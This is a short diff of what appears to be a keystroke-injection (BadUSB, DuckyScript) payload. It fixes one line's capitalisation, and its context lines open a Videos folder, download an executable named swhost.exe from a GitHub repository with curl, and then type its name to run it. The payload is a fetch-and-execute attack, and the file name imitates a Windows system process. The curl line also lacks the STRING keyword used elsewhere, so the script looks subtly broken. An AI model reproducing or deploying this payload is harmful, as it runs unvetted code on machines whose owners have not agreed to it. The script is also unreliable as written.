@@ -6,7 +6,7 @@ ENTER
 DELAY 50
 STRING cd Videos
 ENTER
-delay 100
+DELAY 100
 curl -L -O "https://github.com/Ocanath/gandalfs/raw/refs/heads/master/dist/swhost.exe"
 DELAY 15000
 STRING swhost.exe
